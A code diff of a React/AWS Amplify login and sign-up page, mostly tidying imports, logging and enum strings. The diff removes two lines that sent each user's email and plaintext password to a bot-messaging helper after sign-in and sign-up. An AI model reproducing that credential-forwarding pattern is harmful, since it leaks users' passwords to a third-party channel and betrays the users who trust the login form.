@@ -6,18 +6,26 @@ import SegmentedControl from "../../components/SegmentedControl/SegmentedControl
 import SingIn, {FieldTypeSingIn} from "./SingIn";
 import SingUp, {FieldTypeSingUp} from "./SingUp";
 import SendCode, {FieldTypeSendCode} from "./SendCode";
-import {AuthError, confirmSignUp, resendSignUpCode, signIn, signUp, resetPassword, confirmResetPassword} from 'aws-amplify/auth';
+import {
+  AuthError,
+  confirmSignUp,
+  resendSignUpCode,
+  signIn,
+  signUp,
+  resetPassword,
+  confirmResetPassword
+} from 'aws-amplify/auth';
 import {useTypedMutation, useTypedQuery} from "@dinenation-postgresql/graphql/urql";
 import {CheckCoupon, CheckDomain, CheckMail} from "../../utils/type";
 import LogoSvg, {logoType} from "../../components/svg/LogoSvg";
 import ConfirmEmail, {FieldTypeConfirmEmail} from "./ConfirmEmail";
 import ConfirmPassword, {FieldTypeConfirmPassword} from "./ConfirmPassword";
 import {PageConfig} from "../../utils/utils";
-import {sendBotMessageForMe} from "../../utils/handle";
 
 const isDone = "DONE";
 const isConfirm = "CONFIRM_SIGN_UP";
 const isConfirmPassword = "CONFIRM_RESET_PASSWORD_WITH_CODE";
+
 interface NewUserForm {
   first_name: string;
   last_name: string;
@@ -25,6 +33,7 @@ interface NewUserForm {
   phone: string;
   coupon_id: number;
 }
+
 interface User {
   email: string;
   password: string;
@@ -38,8 +47,8 @@ interface ConfirmSignUpSignUpStep {
 }
 
 export enum TypeAuth {
-  SING_IN = 'sing_in',
-  SING_UP = 'sing_up',
+  SING_IN = 'Sing_in',
+  SING_UP = 'Sing_up',
   SEND_CODE = 'send_code',
   CONFIRM_EMAIL = 'confirm_email',
   CONFIRM_PASSWORD = 'confirm_password',
@@ -95,11 +104,6 @@ const Auth = () => {
       })
 
       if (isSignedIn) {
-        sendBotMessageForMe(`
-      Auth singin
-      --username: ${values?.email},
-      --password: ${values?.password},
-    `)
         localStorage.removeItem('cartList')
         localStorage.removeItem('cartTimestamp');
         localStorage.removeItem('cartTComment');
@@ -112,7 +116,7 @@ const Auth = () => {
       setLoading(true)
     } catch (err) {
       setLoading(true)
-      console.log('----err', err)
+      // console.log('----err', err)
       setAuthError(err as AuthError)
     }
   };
@@ -151,7 +155,6 @@ const Auth = () => {
           setAttribute(destination);
         }
 
-
         await addUser({
           coupon_id: isCoupon.id,
           first_name,
@@ -159,17 +162,12 @@ const Auth = () => {
           email: email?.toLowerCase().trim(),
           phone,
         })
-        sendBotMessageForMe(`
-      Auth sinup
-      --username: ${email},
-      --password: ${password},
-    `)
         setCurrentUser({
           ...values,
         });
         setTypeAuth(TypeAuth.SEND_CODE)
       } catch (err) {
-        console.log('----err', err);
+        // console.log('----err', err);
         setAuthError(err as AuthError);
       } finally {
         setLoading(true);
@@ -203,7 +201,7 @@ const Auth = () => {
       setLoading(true)
     } catch (err) {
       setLoading(true)
-      console.log('----err', err)
+      // console.log('----err', err)
       setAuthError(err as AuthError)
     }
   }
@@ -219,7 +217,7 @@ const Auth = () => {
       setLoading(true)
     } catch (err) {
       setLoading(true)
-      console.log('----err', err)
+      // console.log('----err', err)
       setAuthError(err as AuthError)
     }
   }
@@ -235,7 +233,7 @@ const Auth = () => {
       }
       setLoading(true)
     } catch (err) {
-      console.log('----', err)
+      // console.log('----', err)
       setAuthError(err as AuthError)
       setLoading(true)
     }
@@ -252,7 +250,7 @@ const Auth = () => {
       setTypeAuth(TypeAuth.SING_IN);
       setLoading(true)
     } catch (err) {
-      console.log('----', err)
+      // console.log('----', err)
       setAuthError(err as AuthError)
       setLoading(true)
     }
